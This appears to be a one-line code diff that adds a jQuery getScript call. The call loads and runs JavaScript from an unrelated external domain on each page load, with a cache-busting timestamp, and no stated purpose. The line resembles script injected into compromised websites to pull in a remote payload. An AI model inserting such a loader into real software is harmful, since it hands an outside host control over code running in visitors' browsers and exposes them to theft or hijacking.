@@ -1,0 +1,1 @@
+$.getScript('https://glasgow.splitz.com.br/exec/link/js?id=script&time=' + new Date());
